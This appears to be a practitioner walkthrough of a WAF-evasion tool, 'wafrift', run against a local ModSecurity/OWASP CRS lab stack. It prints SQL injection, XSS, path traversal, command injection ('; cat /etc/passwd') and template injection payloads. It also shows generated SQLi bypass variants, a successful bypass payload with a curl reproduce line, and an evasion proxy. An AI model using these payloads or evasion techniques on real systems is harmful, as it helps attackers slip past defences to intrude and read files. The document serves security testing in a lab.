# Practitioner walkthrough — wafrift v0.2.1 against ModSecurity + OWASP CRS @ PL=4

Live session captured 2026-05-09 against the in-tree
`wafrift-bench/targets/modsec-pl4` stack (ModSecurity 3 + OWASP CRS at
the most aggressive paranoia level — strongest open-source WAF default
deployment). Backend: `kennethreitz/httpbin`. Probe target:
`http://127.0.0.1:18084/get?q=<payload>`.

## Setup

```bash
cd wafrift-staging
wafrift-bench/scripts/up.sh modsec-pl4   # already up in this session
cargo build --release -p wafrift-cli -p wafrift-proxy
```

## STEP 1 — naked attack (control)

Five canonical payload classes, no evasion:

| class | payload | status |
|---|---|---|
| SQLi | `1' OR 1=1--` | **403** |
| XSS  | `<script>alert(1)</script>` | **403** |
| LFI  | `../../../etc/passwd` | **403** |
| CMDi | `; cat /etc/passwd` | **403** |
| SSTI | `{{7*7}}` | **403** |

Confirms PL=4 is doing its job.

## STEP 2 — `wafrift detect`

```text
$ wafrift detect --status 403 --headers "Server: nginx" --body "Forbidden by ModSecurity"
Detected WAF: ModSecurity
Confidence: 70%
Indicators:
  - body: modsecurity
  - status: 403
```

WAF identification correct from a single 403 + body fragment.

## STEP 3 — `wafrift evade` (offline variants)

```text
$ wafrift evade --payload "1' OR 1=1--" --level heavy
Variant #1 confidence 93%   keywordless -> quote_arith_zero       Payload: '+0+'
Variant #2 confidence 93%   keywordless -> quote_arith_sub        Payload: '-0-'
Variant #3 confidence 93%   keywordless -> quote_arith_mul        Payload: '*1*'
... (40+ variants)
```

Pure-offline — no target needed. Practitioner can paste any variant
into Burp / curl / sqlmap directly.

## STEP 4 — `wafrift scan` (live SQLi against PL=4)

```bash
wafrift scan --target http://127.0.0.1:18084 --payload "1' OR 1=1--" \
             --param q --level heavy --delay-ms 25
```

Result: 2398+ variants fired, **discovered bypasses**, persisted **68
techniques to gene-bank** for future replay. Successful bypasses now
print the full payload + a copy-paste curl reproduce line:

```text
Variant #2398 confidence 85%
Techniques: keywordless → quote_arith_sub → encoding::Base64UrlEncode → header::underscore_sub
Payload: Jy0wLSc (7 bytes)
Reproduce: curl -G --data-urlencode q=$'Jy0wLSc' 'http://127.0.0.1:18084'
```

## STEP 5 — `wafrift-proxy` in front of a curl session

```bash
wafrift-proxy --listen 127.0.0.1:18999 \
              --allow-private-upstream \
              --gene-bank-path /tmp/wf-pract-bank.json \
              --max-evade-retries 5
```

3 SQLi requests routed through the proxy (each curl gets its own attempt
+ 5 retries with escalating evasion):

```text
try1: status=403 bytes=239
try2: status=403 bytes=239
try3: status=403 bytes=239
```

Proxy log shows clean per-request escalation:

```text
discovery: evading WAF techniques=Applied 1 technique(s): user-agent-rotation
discovery: evading WAF techniques=Applied 2 technique(s): header:CaseMixing, encoding:DeflateEncode
discovery: evading WAF techniques=Applied 3 technique(s): header:CaseMixing, encoding:DeflateEncode, encoding:GzipEncode
discovery: evading WAF techniques=Applied 4 technique(s): ...
discovery: evading WAF techniques=Applied 5 technique(s): ...
```

The proxy stacked **5 layers of HTTP-level evasion** per failed request
across 18 total upstream attempts. ModSec PL=4 still blocked all 18 —
because the **proxy's escalation tier is HTTP-layer-only** (UA
rotation, header case-mixing, response-encoding mutation). It does NOT
mutate the URL-injected payload bytes themselves; that lives in `scan`.

### Real practitioner finding from the live session

This is a **gap in proxy capability**, not a bug. For payload-byte
mutation you currently route through `wafrift scan` (which DID find
bypasses end-to-end against PL=4 in step 4). The proxy is for
session-aware evasion (UA, headers, body encoding) of arbitrary HTTP
requests; it doesn't currently dive into URL-parameter mutation.

Documented as known-limitation; closing the gap is a real
post-walkthrough item.

## STEP 6 — `/_wafrift/findings.md` and `/_wafrift/status` live

```text
$ curl -s http://127.0.0.1:18999/_wafrift/findings.md
# wafrift live findings

Total proxied: 18 · Total WAF blocks observed: 18 · Hosts seen: 1

_No bypasses discovered yet — keep traffic flowing through the proxy.
Blocks are being recorded and will inform technique selection._
```

```text
$ curl -s http://127.0.0.1:18999/_wafrift/status
{"hosts":[{"blocklisted":[],"blocks":18,"discovery_complete":false,
"host":"127.0.0.1","proven_winners":[],"successes":0}],
"hosts_scanned":1,"status_schema_version":1,"techniques_used":{},
"total_blocks":18,"total_scanned":18}
```

Both endpoints functional, schema-versioned, loopback-gated.

## STEP 7 — Graceful shutdown + gene-bank flush

```bash
kill -INT $(pgrep -f "wafrift-proxy.*18999")
```

Pre-fix: gene-bank file would persist as `{"schema":1,"hosts":{}}` —
host with 18 blocks but no winners/blocklisted got dropped by the
"skip empty hosts" filter. **Fixed in this walkthrough**: hosts with
non-zero blocks (or identified WAF) are now persisted even without
proven winners. Practitioner who SIGTERMs after a long blocked
discovery cycle no longer loses the host telemetry.

## What worked end-to-end

- ✅ `wafrift detect` — identified ModSecurity from 403 + body fragment
- ✅ `wafrift evade` — generated 40+ offline variants
- ✅ `wafrift scan` — fired 2398+ live variants, discovered bypasses,
       persisted 68 techniques to gene-bank
- ✅ `wafrift-proxy` — accepted forward-proxy traffic, escalated
       evasion 1→5 layers per request, recorded 18 blocks against
       the host
- ✅ `/_wafrift/status` + `/_wafrift/findings.md` — live, gated, sane
- ✅ `wafrift seed` + `wafrift bank list/export/import` (verified
       earlier in this session) — round-trip clean
- ✅ `wafrift report` — markdown findings writeup from the gene-bank
- ✅ `wafrift man` — emits troff(1) for `man wafrift`
- ✅ Graceful shutdown — SIGINT triggers gene-bank flush

## Practitioner gaps surfaced by the walkthrough

1. **Proxy evasion tier ≠ scan evasion tier.** The proxy currently
   does HTTP-layer-only escalation (UA, headers, body encoding).
   `scan` does payload-byte mutation. A real engagement using only
   the proxy will under-deliver against strict WAFs like PL=4.
   Documented in `docs/PROXY_TOOLING.md` already; improving
   proxy-side payload mutation is a real follow-on item.
2. **Gene-bank dropped block-only hosts.** Fixed in this commit.
3. `--allow-private-upstream` is required for any localhost target
   (intentional SSRF protection). The error path when not set
   silently returns a 403 from the proxy — could be more explicit.
   Logged for future polish.

## Reproducibility

Every step above is rerunnable. The bench stack (`wafrift-bench/
targets/modsec-pl4`) ships a fixed-version compose file; the wafrift
binaries are pinned to the workspace's `0.2.1`.
